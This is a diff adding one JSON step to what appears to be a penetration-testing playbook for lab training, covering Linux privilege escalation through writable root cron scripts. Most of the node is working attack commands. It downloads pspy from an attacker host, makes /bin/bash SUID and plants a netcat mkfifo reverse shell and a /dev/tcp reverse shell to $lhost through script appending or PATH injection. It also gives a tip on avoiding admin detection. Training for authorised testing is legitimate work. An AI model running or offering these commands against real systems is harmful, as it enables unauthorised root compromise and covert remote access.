@@ -1,0 +1,26 @@
+{
+  "id": "cron_check",
+  "phase": "LINUX",
+  "title": "Cron Job Exploitation",
+  "body": "Module 18.3.1: find scripts run by root cron that you can write to. Append a reverse shell — within a minute you have root. Check /var/log/syslog for what's actually running.",
+  "cmd": "# ── FIND CRON JOBS ────────────────────────────────────\ncat /etc/crontab\nls -la /etc/cron*\ncat /etc/cron.d/*\ncrontab -l\nsudo crontab -l   # root jobs if sudo allows\n\n# ── CHECK SYSLOG FOR RUNNING CRON JOBS ───────────────\n# Most reliable way to see what actually runs and when\ngrep \"CRON\" /var/log/syslog\ngrep \"CRON\" /var/log/syslog | tail -20\n# Look for: (root) CMD (/path/to/script.sh)\n\n# ── PSPY — WATCH WITHOUT ROOT ────────────────────────\n# Download: github.com/DominicBreuker/pspy\nwget http://$lhost/pspy64 -O /tmp/pspy64   # 64-bit\nwget http://$lhost/pspy32 -O /tmp/pspy32   # 32-bit (match arch)\nchmod +x /tmp/pspy64 && /tmp/pspy64\n\n# Reading output — look for UID=0:\n# CMD: UID=0 PID=121 | /bin/sh -c /var/archives/archive.sh\n# CMD: UID=0 PID=122 | /bin/bash /var/archives/archive.sh\n#   → root running archive.sh every minute\n#   → ls -la /var/archives/archive.sh\n#   → if world-writable: echo \"chmod u+s /bin/bash\" >> /var/archives/archive.sh\n#   → wait 1 min → /bin/bash -p → root\n\n# Filter to just root processes:\n/tmp/pspy64 | grep \"UID=0\"\n\n# Also watch for:\n# Creds in args: sshpass -p, mysql -p, curl -u\n# Scripts without full path = PATH hijack\n# Temp files in /tmp = race condition\n\n# ── CHECK SCRIPT PERMISSIONS ──────────────────────────\n# Once you find a script run by root:\nls -la /home/joe/.scripts/user_backups.sh\n# -rwxrwxrw- = world writable = exploitable\ncat /home/joe/.scripts/user_backups.sh\n\n# ── EXPLOIT — APPEND REVERSE SHELL ───────────────────\n# Method 1: SUID bash (cleanest — no listener needed)\n# Lab validated: OffSec capstone\necho \"chmod u+s /bin/bash\" >> /path/to/script.sh\n# Wait up to 1 minute for cron to fire\nls -la /bin/bash   # watch for s bit: -rwsr-xr-x\n/bin/bash -p       # -p preserves effective UID = root shell\n# bash-5.1# whoami → root\n\n# Method 2: reverse shell\necho \"\" >> /path/to/script.sh\necho \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost 443 >/tmp/f\" >> /path/to/script.sh\n\n# Method 3: copy bash with SUID\necho \"cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\" >> /path/to/script.sh\n# Wait then: /tmp/rootbash -p\n\n# ── LISTENER ON KALI ─────────────────────────────────\nnc -nlvp 443\n# Wait up to 1 minute for cron to fire\n\n# ── PATH INJECTION IN CRON ────────────────────────────\n# If crontab has PATH= and calls script without full path:\n# PATH=/home/joe:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n# * * * * * cleanup.sh\n# Create malicious cleanup.sh in /home/joe:\necho '#!/bin/bash\nbash -i >& /dev/tcp/$lhost/443 0>&1' > /home/joe/cleanup.sh\nchmod +x /home/joe/cleanup.sh",
+  "warn": "Always use >> to APPEND to the cron script, never > which overwrites it. Overwriting may break the script and alert the admin. Check with cat after appending.",
+  "choices": [
+    {
+      "label": "Got root shell from cron",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Script not writable — try PATH injection",
+      "next": "linux_privesc_extra"
+    },
+    {
+      "label": "Nothing writable — watch with pspy",
+      "next": "linpeas"
+    },
+    {
+      "label": "Back to full enum",
+      "next": "linux_post_exploit"
+    }
+  ]
+}
